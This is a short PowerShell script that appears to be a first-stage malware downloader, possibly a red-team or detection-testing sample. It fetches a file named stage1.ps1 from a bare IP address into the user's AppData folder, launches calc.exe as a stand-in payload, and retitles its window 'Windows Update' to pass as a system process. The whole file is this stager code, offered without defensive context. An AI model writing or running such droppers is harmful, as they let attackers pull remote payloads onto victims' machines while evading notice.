
[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://198.51.100.163:443/stage1.ps1',
    [string]$Stage2Path = "$env:APPDATA\stage1.bin",
    [int]$StageTimeout = 134
)
Invoke-WebRequest -Uri $Stage1Url -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "stage marker 13 reached"
